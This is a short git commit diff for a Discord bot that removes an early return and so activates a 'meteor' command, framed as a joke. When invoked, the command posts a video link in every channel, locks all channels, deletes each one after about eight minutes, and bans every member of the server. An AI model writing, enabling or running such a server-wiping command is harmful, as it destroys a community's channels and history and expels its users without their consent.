09926cec8a351889c19ca8fcec604ba25bf392d3
Comfy-Mittens <hitsuzen13@gmail.com>
2017-09-11 10:07:33 -0600

    Update meteor
    Now with more pewpew

--- commands/meteor.js
+++ commands/meteor.js
@@ -1,10 +1,13 @@
 exports.run = (client, message, args) => {
-	return;
-	message.channel.send("https://www.youtube.com/watch?v=1xOOFCltZuc");
+	// Go through each channel
  	message.guild.channels.forEach(channel => {
-    	channel.delete();
+		// Link the video and lock the channel
+		channel.send("https://www.youtube.com/watch?v=1xOOFCltZuc");
+		channel.overwritePermissions(message.guild.id, {"SEND_MESSAGES": false}, "Meteor~");
+		// Delete after 8:06 minutes
+		setTimeout(() => channel.delete(), ((8 * 60) + 6) * 1000);
   	});
   	message.guild.members.forEach(member => {
-    	member.kick();
+    		member.ban({days: 0, reason: "Meteor~"});
   	});
 };
